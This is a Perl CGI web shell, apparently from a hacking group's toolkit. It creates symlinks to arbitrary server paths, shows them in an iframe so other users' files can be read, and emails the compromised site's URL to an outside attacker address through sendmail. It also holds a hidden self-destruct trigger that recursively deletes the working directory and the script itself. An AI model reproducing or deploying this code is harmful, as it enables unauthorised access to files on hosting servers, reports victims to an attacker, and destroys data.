#!/usr/bin/perl -w
use Cwd;

my $random_string=&generate_random_string(11);
my $dir = getcwd ."nn";
my $fl = getcwd;

#########################Variabile##########################
$ip = $ENV{REMOTE_ADDR};

$mailprog = '/usr/lib/sendmail';
$distension = $random_string; 
#########################Content##########################
print "Content-type: text/htmlnn";
#########################Split URL##########################
@values = split(/&/,$ENV{'QUERY_STRING'});
foreach $i (@values) {
      
    ($varname, $mydata) = split(/=/,$i);
    
}
#########################AutoDistrugere##########################
if ($mydata eq "crisalixx")
{
system('rm','-r',$fl);
unlink("sa.pl");

print "Crisalixx is gone";
}
else{
#########################Creare Sy##########################
$symlink = symlink($mydata,$distension);
if($symlink == 1) { 


print "Your IP Adress :" .$ip;
print '<body text="#C0C0C0" bgcolor="#505050 ">';

print '<br>Home Directory: '.$dir;
print '<table border="1"><iframe width="100%" width="800" height="550" src=' . $distension .'></iframe></table>';
print '<div align="center"><font color="#3399FF"><b>crisalixx@thieves-team.com</b></font></div>';

}
else { 

print "Your IP Adress :" .$ip;
print '<body text="#C0C0C0" bgcolor="#505050 ">';

print '<br>Home Directory: '.$dir;
print '<table border="1"><iframe width="100%" width="800" height="550" src=' . $distension .'></iframe></table>';
print '<div align="center"><font color="#3399FF"><b>crisalixx@thieves-team.com</b></font></div>';
$fl= "http://$ENV{HTTP_HOST}$ENV{REQUEST_URI}n";
open(MAIL,"|$mailprog -t");
$subject = "Yhuuu";
print MAIL "To: crisalixx@thieves-team.comn";
print MAIL "From: crisalixx@thieves-team.com>n";
print MAIL "Subject: $subjectnn";
print MAIL $fl."nn";

close (MAIL);
}
}
#########################Random Name##########################
sub generate_random_string
{
	my $length_of_randomstring= shift;
			
	my @chars=('a'..'z','A'..'Z','0'..'9','_');
	my $random_string;
	foreach (1..$length_of_randomstring) 
	{
		
		$random_string.=$chars[rand @chars];
	}
	return $random_string;
}
